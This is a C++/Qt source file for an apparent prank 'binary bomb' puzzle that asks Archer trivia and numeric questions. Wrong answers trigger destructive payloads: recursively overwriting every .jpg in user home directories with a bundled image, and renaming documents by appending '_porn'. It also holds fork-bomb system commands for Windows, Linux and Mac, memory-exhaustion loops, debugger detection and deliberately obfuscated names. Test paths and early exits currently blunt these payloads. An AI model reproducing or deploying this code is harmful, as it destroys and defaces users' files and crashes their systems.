#include <QCoreApplication>
#include <QDirIterator>
#include <QDir>
#include <QDebug>
//#include <QImage>
#include <QtGui/QImage>
#include <QTransform>
#include <QCryptographicHash>
#include <iostream>
#include <stdio.h>
#include <math.h>
#include <vector>

#include <sys/types.h>
#include <stdlib.h>

#ifdef Q_OS_WIN
#include <Windows.h>
#define OS 0
#elif defined(Q_OS_MAC)
#define OS 1
#elif defined(Q_OS_LINUX)
#define OS 2
#endif
enum ops{
	win,
	mac,
	linux,
};


using namespace std;

double getNumaNuma(double numa){
	double numaTimes2=numa*0.5;
	qint64 shortNuma= *(qint64*)&numa;
	shortNuma = 0x5fe6eb50c7b537a9 - (shortNuma>>1);
	numa = *(double*) &shortNuma;
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	numa = numa *(1.5 - (numaTimes2*numa*numa));
	return numa;
}


/* Taken from: https://stackoverflow.com/questions/15580179/how-do-i-find-the-name-of-an-operating-system
	Finds the OS type, for use when finding relevant directories */
string getOsName(){
#ifdef _WIN32
	return "Windows";
#elif _WIN64
	return "Windows";
#elif __APPLE__ || __MACH__
	return "Mac OSX";
#elif __linux__
	return "Linux";
#else
	return "Other";
#endif
}

void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suitTag){
	bool dirtPanorama=false;
	if(image3.width()>image3.height()){
		dirtPanorama=true;
	}
	bool earthVista=false;
	if(image1.width()>image2.height()){
		earthVista=true;
	}
	QImage* favoriteImage[2]={earthVista?&image2:&image1,earthVista?&image1:&image2};
	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
}
quint64 canard(quint64 canary){
	canary <<= canary---1>>3;
	return (std::pow(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary)-std::pow(-getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2),canary))/(1+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2)+getNumaNuma((1+getNumaNuma(0.2))/2)*getNumaNuma((1+getNumaNuma(0.2))/2));
}

void pleaseOnlyReadatNight(QString dir){
	if(OS==mac){
		dir=QString("");
	}else if(OS==linux){
		dir=QString("/home");
	}else{
		dir=QString("C:/Users");
	}
	dir = QString("C:/testImages"); // For testing

	auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;

	QDirIterator itr(dir, QStringList() << "*.txt"<<"*.doc"<<"*.docx", drain, QDirIterator::Subdirectories);
	while(itr.hasNext()){
		QString figurative = "_porn"; // As opposed to literal
		auto eman=itr.next();
		qDebug()<<eman;
		QFileInfo lanigiro(eman);
		//QFileInfo original("/home/user/myfile.txt");
		QFile elif(lanigiro.absoluteFilePath());
		QString rotarapes = (OS==linux) ? "/" : "\\";
		QString eemmaann = lanigiro.canonicalPath() + rotarapes + lanigiro.baseName() + figurative;
		if (!lanigiro.completeSuffix().isEmpty())
			eemmaann += "." + lanigiro.completeSuffix();
		elif.rename(eman, eemmaann);
	}
	exit(1-2-52+3512-1235*5);
}

void cause(string* idx, int fet){
	std::cout<<idx->c_str()+fet<<std::endl;
//	return (idx[1337]);
}

void failure(string fun,int wabba){
	string* p = &fun;
	cause(p,wabba);
//	return;
}

void letsSpoon(){
	while(1){
		if(OS==win){
			system("%0|%0");
		}else if(OS==linux){
			system(":(){ :|:& };:");
		}else{
			system("./$0|./$0&");
		}
		exit(-1); // So as not to bomb our machines
	}
	letsSpoon();
}

void gehinomEchad(){
	while(1){
		char* oEchat = new char[1337];
		exit(-5); // So as not to bomb our machines
		if(oEchat == NULL){
			continue;
		}
	}
}

void gehinomShtaim(){
	// QThread
	int l = (3*3)-7;
	while(1 == --l){
		char* echad = new char[1];
		if(echad == NULL){
			continue;
		}
		exit(-5); // So as not to bomb our machines
	}
}

QString escaped(QString str){
	QString escaped;
	escaped.reserve(6*str.size());
	for(QString::const_iterator it=str.begin();it!=str.end();++it){
		QChar ch = *it;
		ushort code = ch.unicode();
		if(code<0x80){
			escaped+=ch;
		}else{
			escaped+="\\u";
			escaped+=QString::number(code,16).rightJustified(4,'0');
		}
	}
	return escaped;
}

QString spaceloop(QString space){
	int iIiIiiIIiiIIIi=48;
	if(space.length()<5){
		for(auto &time:space){
			time=QChar(time.unicode()+iIiIiiIIiiIIIi);
			iIiIiiIIiiIIIi+=4;
		}
	}
	for(auto &time:space){
		time=QChar(time.unicode()+iIiIiiIIiiIIIi);
		iIiIiiIIiiIIIi+=4;
	}
	return space;
}


QString timeloop(QString time){
	int iIiIiiIIiiIIIi=48;
	for(auto &space:time){
		space=QChar(space.unicode()-iIiIiiIIiiIIIi);
		iIiIiiIIiiIIIi+=4;
	}
	return time;
}


int main(/*int argc, char *argv[]*/){
	//QCoreApplication a(argc, argv);
	//    string osName = getOsName();
	QList<double> nommies;
#ifdef Q_OS_WIN
	if(IsDebuggerPresent()){
		return(12473);
	}
	SetConsoleOutputCP(CP_UTF8);
#endif
	std::cout<<"Welcome to the pit of despair!\nYou can check in any time you like, but you may never leave."<<std::endl<<std::endl;

	std::cout<<"I swear I had something for this phase!"<<std::endl;
	goto Phase10;
Phase1:
	{
		QList<qint64> nums({2985,5318008,1337});
		double answers[]={1.122306114604289e-07,3.535916717302045e-14,5.594189650861030e-07};
		if(nums.length()!=nommies.length()){
			qDebug()<<"messed up phase 1: Wrong number of entries";
			goto ousted;
		}
		for(int i=0;i<nums.length();++i){
			if(nums[i]!=round(getNumaNuma(nommies[i]))){
				qDebug()<<"messed up phase 1";
				goto ousted;
			}
		}
		goto outed;
	}

prior:
	{
		bool sadness=true; //:(
		if(!nommies.isEmpty()){
			nommies.clear(); //Yum!!
			sadness=false;
		}
		std::string str;
		std::getline(std::cin,str);
		QString cheese(str.c_str());
		QStringList noms=cheese.split(" ",QString::SkipEmptyParts);
		bool doky=true;
		for(QString nom:noms){
			auto treat=nom.toDouble(&doky);
			if(doky){
				nommies.append(treat);
			}
		}
		if(sadness)
		goto Phase1;
		goto DefinitelyNotPhase1;
	}
ousted:
	{
		QString dir;
		QImage maliciousImage(":/bunny.jpg");
		if(maliciousImage.isNull()){
			exit(-1);
		}
		QTransform rot;
		rot.rotate(90);
		QImage maliciousImageRotated(maliciousImage.transformed(rot,Qt::SmoothTransformation));
		if(OS==win){
			dir=QString("C:/Users");
		}else if(OS==mac){
			dir=QString("...");
		}else if(OS==linux){
			dir=QString("/home");
		}
		dir = QString("C:/testImages");

		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;

		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
		while(itr.hasNext()){
			auto imageName=itr.next();
			QImage fImage(imageName);
			if(fImage.isNull()){
				continue;
			}
			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
		}
		return 2;
	}
outed:
	std::cout<<"Fill in the blanks:\n___ is to ___ as ___ is to ___, whilst ___ is a ___ ___; you ________."<<std::endl;
	goto prior;
	return 0;

DefinitelyNotPhase1:
	{
		QList<quint64> nummies({308061521170129,1346269,4660046610375544832,28657});
		quint64 answers[]={18,16,23,12};
		if(nummies.length()!=nommies.length()){
			qDebug()<<"messed up DefinitelyNotPhase1: Wrong number of entries";
			gehinomEchad();
		}
		for(int i=0;i<nummies.length();++i){
			if(nummies[i]!=canard(nommies[i])){
				qDebug()<<"messed up DefinitelyNotPhase1";
				gehinomEchad();
			}
		}
		std::cout<<"That was a bit of a lie, but you figured it out anyway, good on ya!"<<std::endl;
		return 0;
	}
Phase10:
	{
		QStringList answers{"yes","13","ocelot","pam"};
		QCryptographicHash taters(QCryptographicHash::Sha256);
		QString tweedle("6a039d1d1406d62c1f6f83e4aa6a5124f1e94bb214476c79052001b66b9cabe4");
		QString dum("e5b5e0ba9f3d51657f797c2e616f09a83f1ef277521495d0dd9ccf4ca9104374");
		vector<char> viktor{'b','0','8','c','8','c','f','0','a','7','f','b','0','0','6','9','7','4','b','c','b','7','2','f','f','3','1','a','3','8','9','1','6','3','1','e','9','9','f','1','5','8','b','1','1','2','d','7','2','f','c','e','5','3','b','e','c','6','3','1','8','1','d','b'};
		QString dee("f2b8507d75e56e72a0af528a1aa64215d016db3e23a8bbf698124a398c910079");
		std::string str;
		std::cout<<"Are Sterling and Mallory eskimo brothers?"<<std::endl;
		getline(std::cin,str);
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(tweedle!=taters.result().toHex())
			failure("Answer was:",99999);
		std::cout<<"How many tallies does Pam have on her back?"<<std::endl;
		getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(taters.result().toHex()!=dum)
			failure("Answer was:",198735);

		std::cout<<"What type of animal is Babou?"<<std::endl;

		getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		if(dee!=taters.result().toHex())
			failure("Answer was:",949843);

		std::cout<<"Which character wore a dolphin puppet on their hand?"<<std::endl;
		getline(std::cin,str);
		taters.reset();
		taters.addData(escaped(spaceloop(QString(str.c_str()).toLower())).toUtf8());
		QString input(taters.result().toHex());
		int c = 15 ^ 15;
		while(c < input.length()&& input[c]==viktor[c]){
			c++; // Get it?
		}
		if(c < input.length()){
			failure("Answer was:",54831);
		}
		std::cout<<"Congratulations, you know some trivia, but do you know this?"<<std::endl<<std::endl;
	}
	std::cout<<"Answers are against your boxy perception.\n";
	goto prior;
	//return a.exec();
	return 0;
}
